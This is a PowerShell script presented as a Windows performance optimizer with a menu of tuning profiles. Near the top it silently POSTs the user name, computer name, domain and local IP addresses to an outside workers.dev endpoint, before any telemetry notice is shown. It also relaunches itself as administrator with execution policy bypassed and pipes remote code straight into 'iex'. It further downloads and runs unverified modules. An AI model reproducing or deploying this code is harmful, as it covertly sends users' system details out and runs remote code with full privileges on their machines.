<#
.SYNOPSIS
    Windows Optimizer Orchestrator (Lazy-Loading, IRM/IEX ready, Auto-Elevate)

.AUTHOR
    Shourav (rhshoruav)

.GITHUB
    https://github.com/rhshoruav

.VERSION
    2.4.0
#>

# -------------------------------
# Directories
# -------------------------------
<#
.SYNOPSIS
    Windows Optimizer Orchestrator
#>

# -------------------------------
$ScriptRoot  = Join-Path $env:TEMP "WindowsOptimizer"
$CoreDir     = Join-Path $ScriptRoot "core"
$ProfilesDir = Join-Path $ScriptRoot "profiles"
$LogsDir     = Join-Path $ScriptRoot "logs"
$SnapDir     = Join-Path $ScriptRoot "snapshots"
$ScriptFile  = Join-Path $ScriptRoot "Select-Optimization.ps1"

# Ensure directories exist
$null = New-Item -ItemType Directory -Force -Path $ScriptRoot,$CoreDir,$ProfilesDir,$LogsDir,$SnapDir
Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nSelect Optimization`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null

# -------------------------------
# Auto-elevate
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
        ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Restarting script as Administrator..." -ForegroundColor Yellow
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/Select-Optimization.ps1 | iex`""
    $psi.Verb = "runas"
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Exit
}

# -------------------------------
$ScriptVersion = "2.3.0"
$AuthorName    = "Shourav"
$ProjectName   = "Windows Optimizer"

function Load-CoreModule {
    param([string]$ModuleName)
    $file = Join-Path $CoreDir $ModuleName
    if (-not (Test-Path $file)) {
        $content = Invoke-RestMethod "https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/core/$ModuleName" -UseBasicParsing
        [System.IO.File]::WriteAllText($file, $content, [System.Text.Encoding]::UTF8)
    }
    . $file
}

function Load-Profile {
    param([string]$ProfileName)
    $file = Join-Path $ProfilesDir $ProfileName
    if (-not (Test-Path $file)) {
        $content = Invoke-RestMethod "https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/profiles/$ProfileName" -UseBasicParsing
        [System.IO.File]::WriteAllText($file, $content, [System.Text.Encoding]::UTF8)
    }
    . $file
}

function Show-Banner {
    Clear-Host
    Write-Host "============================================"
    Write-Host " $ProjectName"
    Write-Host "============================================"
    Write-Host " Version : $ScriptVersion"
    Write-Host " Author  : $AuthorName"
    Write-Host "============================================"
    Write-Host ""
}
Show-Banner

# -------------------------------
# Load core modules
Load-CoreModule "Logger.ps1"
Load-CoreModule "Telemetry.ps1"
Load-CoreModule "Snapshot.ps1"

Write-Log "Windows Optimizer started"
try { Save-Snapshot } catch { Write-Log "Snapshot failed: $_" "ERROR"; Exit 1 }
Show-TelemetryNotice

# -------------------------------
# Menu
Write-Host "Select Optimization Profile:"
Write-Host "1. Level 1 - Balanced"
Write-Host "2. Level 2 - Performance"
Write-Host "3. Level 3 - Aggressive"
Write-Host "4. Gaming"
Write-Host "5. Hardware-Aware"
Write-Host "6. Restore Snapshot"
$choice = Read-Host "Enter your choice"

switch ($choice) {
    "1" { Load-Profile "Level1-Balanced.ps1"; Send-Telemetry -ProfileName "Level 1 - Balanced" }
    "2" { Load-Profile "Level2-Performance.ps1"; Send-Telemetry -ProfileName "Level 2 - Performance" }
    "3" { Load-Profile "Level3-Aggressive.ps1"; Send-Telemetry -ProfileName "Level 3 - Aggressive" }
    "4" { Load-Profile "Gaming.ps1"; Send-Telemetry -ProfileName "Gaming" }
    "5" { Load-Profile "Hardware-Aware.ps1"; Send-Telemetry -ProfileName "Hardware-Aware" }
    "6" { Load-CoreModule "Restore.ps1"; Restore-Snapshot }
    default { Write-Host "Invalid selection" -ForegroundColor Yellow; Write-Log "Invalid menu selection: $choice" "WARN" }
}

Write-Log "Execution completed"
